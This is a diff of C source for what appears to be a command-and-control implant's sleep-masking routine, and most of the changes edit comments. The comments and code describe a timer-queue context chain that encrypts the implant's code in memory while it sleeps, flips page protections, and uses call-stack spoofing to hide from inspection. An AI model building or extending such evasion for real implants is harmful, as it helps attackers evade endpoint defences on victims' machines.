@@ -225,11 +225,10 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     } TP_TIMER_CONTEXT, *PTP_TIMER_CONTEXT;
 
     /**
-    * Timer queue wake callback (T6) — WAITORTIMERCALLBACK signature.
+    * Fallback wake callback for the TpAllocTimer path.
     *
-    * By the time this fires, the sleepmask code has been decrypted (T4)
-    * and restored to RX (T5), so this callback can execute normally.
-    * It unmasks beacon memory and signals the main thread to wake.
+    * Fired when the sleep timer expires. Unmasks beacon memory
+    * (sections + heap records) and signals the main thread to wake.
     *
     * @param Context          Pointer to TP_TIMER_CONTEXT.
     * @param TimerOrWaitFired TRUE if the timer expired.
@@ -280,16 +279,18 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
     *
     * Timer chain (WT_EXECUTEINTIMERTHREAD, serialized):
     *   Setup:  RtlCaptureContext → SetEvent(EvntTimer)
-    *   Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE) — gate
+    *   Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, FALSE) — gate
     *   Ctx[1]: VirtualProtect(sleepmask, PAGE_READWRITE)
     *   Ctx[2]: SystemFunction032(encrypt sleepmask code)
-    *   Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs) — sleep
+    *   Ctx[3]: WaitForSingleObjectEx(NtCurrentProcess, sleepMs, FALSE) — sleep
     *   Ctx[4]: SystemFunction032(decrypt sleepmask code)
     *   Ctx[5]: VirtualProtect(sleepmask, PAGE_EXECUTE_READ)
     *   Ctx[6]: SetEvent(EvntEnd) — wake main thread
     *
     * NtSignalAndWaitForSingleObject atomically unblocks the chain and
-    * waits for completion. UnMaskBeacon runs on the main thread after wake.
+    * waits for completion, called through Draugr stack spoofing so the
+    * main thread's call stack appears clean while blocked in the kernel.
+    * UnMaskBeacon runs on the main thread after wake.
     *
     * Falls back to basic TpAllocTimer sleep if self-masking is unavailable.
     *
@@ -421,7 +422,7 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
                 Ctx[i].Rsp -= sizeof(PVOID);
             }
 
-            // Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, NULL) — gate
+            // Ctx[0]: WaitForSingleObjectEx(EvntStart, INFINITE, FALSE) — gate
             Ctx[0].Rip = (DWORD64)pWaitForSingleObjectEx;
             Ctx[0].Rcx = (DWORD64)hEvntStart;
             Ctx[0].Rdx = (DWORD64)INFINITE;
@@ -495,8 +496,8 @@ typedef VOID    (NTAPI* TpReleaseTimerPtr)(PTP_TIMER);
         // [12] Clean up. RtlDeleteTimerQueueEx with INVALID_HANDLE_VALUE blocks
         //      until all callbacks complete and the timer thread terminates.
         //      Without this, the timer thread may still be returning through
-        //      NtTestAlert/timer dispatch when the queue structures are freed,
-        //      causing a use-after-free crash in TppTimerpExecuteCallback.
+        //      the dispatch when the queue structures are freed, causing a
+        //      use-after-free crash in TppTimerpExecuteCallback.
     LEAVE:
         if (hTimerQueue) {
             RtlDeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
